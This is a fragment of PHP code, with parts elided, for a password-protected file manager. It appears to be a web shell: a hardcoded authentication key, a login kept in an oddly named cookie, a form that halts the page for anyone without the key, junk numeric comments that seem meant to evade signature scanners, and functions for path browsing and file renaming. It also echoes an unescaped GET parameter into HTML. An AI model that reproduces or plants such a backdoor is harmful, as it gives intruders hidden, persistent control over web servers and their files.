...
$auth_key = "395955a320054af88580a9bdab851895";
...
$pass = false;
if (isset($_COOKIE['pw_name_72915'])) {
    if(($_COOKIE['pw_name_72915']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_72915'])) {
        if(($_POST['pw_name_72915']) == $auth_key) {
            setcookie("pw_name_72915", $_POST['pw_name_72915']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_72915' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724210991503944 1724210991275164 1724210991774090 1724210991997948
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724210991503944 1724210991275164 1724210991774090 1724210991997948
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724210991503944 1724210991275164 1724210991774090 1724210991997948
            $name = PATH . "/" . $_GET['r'];
